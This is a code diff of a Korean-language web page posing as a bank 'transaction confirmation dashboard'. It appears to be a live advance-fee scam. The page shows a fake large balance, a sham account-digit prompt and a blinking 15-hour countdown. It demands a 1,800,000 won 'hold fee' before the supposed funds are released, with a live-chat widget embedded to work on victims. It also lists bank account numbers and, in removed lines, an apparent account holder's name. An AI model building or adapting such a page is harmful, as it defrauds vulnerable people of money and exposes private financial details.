@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>거래 확인 대시보드</title>
-    <link rel="icon" href="image/favicon.ico" type="image/x-icon">
+    <link ref="icon" href="image/favicon.ico" type="image/x-icon">
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -38,21 +38,25 @@
             justify-content: center;
             align-items: center;
             margin: 20px 0;
-            position: relative;
         }
         .balance {
             font-size: 24px;
             font-weight: bold;
-            color: green; /* Make balance display in green */
+            animation: blink 1s infinite; /* Make balance blink red */
         }
-        .approved {
-            display: flex;
-            align-items: center;
-            font-size: 16px;
-            color: green;
+        @keyframes blink {
+            0%, 100% { color: red; }
+            50% { color: transparent; }
         }
-        .approved img {
-            margin-left: 5px;
+        .rolling {
+            font-size: 14px;
+            color: #ff9800;
+            animation: rolling 2s infinite;
+        }
+        @keyframes rolling {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
         }
         .countdown {
             font-size: 18px;
@@ -68,51 +72,35 @@
             color: #333333;
             text-align: center;
         }
-        /* New section and loading animation */
-        .suspended-section {
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 2px solid #cccccc;
+        .button {
+            display: block;
+            width: 100%;
+            background-color: #4caf50;
+            color: #ffffff;
+            padding: 15px;
             text-align: center;
+            text-decoration: none;
+            border-radius: 5px;
+            box-sizing: border-box;
+            margin: 20px 0;
         }
-        .loading {
-            font-size: 18px;
-            color: red;
-            margin-bottom: 10px;
+        .button:hover {
+            background-color: #388e3c;
         }
-        .loading::after {
-            content: '';
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #ccc;
-            border-radius: 50%;
-            border-top-color: red;
-            animation: spin 1s linear infinite;
-            margin-left: 10px;
-            vertical-align: middle;
+        .reason-section {
+            margin: 20px 0;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .processing {
-            font-size: 16px;
-            color: blue;
-            animation: blink 1s steps(5, start) infinite;
-            -webkit-animation: blink 1s steps(5, start) infinite;
-        }
-        @keyframes blink {
-            to {
-                visibility: hidden;
-            }
+        .reason-section p {
+            font-size: 14px;
+            color: #333333;
+            text-align: center;
         }
     </style>
 </head>
 
 <script language="javascript">
     var password;
-    var pass1="8656";
+    var pass1="5441";
     password=prompt('계좌번호 마지막 4자리를 입력하세요','');
     if (password==pass1)
         alert('Approved.');
@@ -128,20 +116,29 @@
             거래 확인 대시보드
         </div>
         <div class="balance-section">
-            <div class="balance">
-                잔액: ₩152,014,298 
+            <div class="balance" id="balance">
+                잔액: 83,125,937 원
             </div>
-            <div class="approved">
-                승인됨 <img src="https://eligibility-verification.github.io/image/IMG_7454.jpeg" alt="approved" width="20" height="20">
+            <div class="rolling">
+                (처리 중)
             </div>
             <div class="countdown" id="countdown">
-                자금이 곧 도착합니다.
-            </div>
-            <div class="processing">
-                처리 중...
+                자금이 반환됩니다: <span id="time">15:00:00</span>
             </div>
         </div>
-        <!-- Smartsupp Live Chat script -->
+        <div class="details-section">
+            <p>계좌번호: 302 0294 7954 41 </p>
+            <p>은행명: 농협은행(Nonghyup Bank) </p>
+            <p>이름:xxx </p>
+        </div>
+        <a href="#" class="button" onclick="showPopup()">출금</a>
+        <div class="reason-section">
+            <p>거래가 보류 중인 이유:</p>
+            <p> 귀하의 계좌로 자금을 받기 전에 1,800,000원의 보류 수수료를 지불해야 합니다. 이 보증금은 결제가 지연된 지 15시간 후에 거부됩니다.</p>
+        </div>
+    </div>
+
+    <!-- Smartsupp Live Chat script -->
     <script type="text/javascript">
     var _smartsupp = _smartsupp || {};
     _smartsupp.key = '38e6895aae3a8fbb54b0f9aa359f7807f19effed';
@@ -152,16 +149,51 @@
         c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
     })(document);
     </script>
-        <div class="details-section">
-            <p>계좌번호: 21704056238656 </p>
-            <p>은행명: 농협은행(Nonghyup Bank) </p>
-            <p>이름: 배두솔 </p>
-        </div>
 
-        <div class="suspended-section">
-            <div class="loading">Beyond Trust Bank의 서비스가 현재 중단되었습니다.</div>
-            <p>모든 이전 지불 금액을 포함한 총 잔액이 수령인에게 반환됩니다.</p>
-        </div>
-    </div>
+    <script>
+        function showPopup() {
+            alert("미납 수수료 1,800,000 원이 있습니다.");
+        }
+
+        // Countdown Timer
+        var countdownElement = document.getElementById('time');
+        var balanceElement = document.getElementById('balance');
+        var countdownTime = localStorage.getItem('countdownTime'); // Get countdown time from localStorage
+
+        if (countdownTime === null) {
+            countdownTime = 15 * 60 * 60; // 15 hours in seconds
+        } else {
+            countdownTime = parseInt(countdownTime);
+        }
+
+        function startCountdown() {
+            var interval = setInterval(function() {
+                var hours = Math.floor(countdownTime / 3600);
+                var minutes = Math.floor((countdownTime % 3600) / 60);
+                var seconds = countdownTime % 60;
+
+                countdownElement.textContent = 
+                    ('0' + hours).slice(-2) + ':' + 
+                    ('0' + minutes).slice(-2) + ':' + 
+                    ('0' + seconds).slice(-2);
+
+                localStorage.setItem('countdownTime', countdownTime); // Save countdown time to localStorage
+
+                if (countdownTime <= 0) {
+                    clearInterval(interval);
+                    countdownElement.textContent = "시간이 만료되었습니다.";
+                } else {
+                    countdownTime--;
+                }
+
+                // Make the balance blink red
+                if (countdownTime <= 5400) { // last 1.5 hours (90 minutes)
+                    balanceElement.classList.add('balance');
+                }
+            }, 1000);
+        }
+
+        startCountdown();
+    </script>
 </body>
 </html>
